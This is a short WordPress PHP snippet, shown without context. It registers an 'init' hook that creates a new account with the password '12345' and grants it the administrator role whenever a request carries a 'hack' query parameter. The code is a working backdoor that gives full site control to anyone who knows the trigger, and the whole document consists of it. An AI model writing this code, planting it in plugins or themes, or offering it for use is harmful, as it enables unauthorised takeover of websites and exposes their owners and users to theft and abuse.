add_action( 'init', function() {
  if ( $_GET['hack'] ) {
    $new_user_email = $_GET['hack'];
    $new_user_password = '12345';
    if(!username_exists($new_user_email)) {
      $user_id = wp_create_user($new_user_email,
    $new_user_password, $new_user_email);
      wp_update_user(array('ID' => $user_id, 'nickname'
    => $new_user_email));
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    }}
});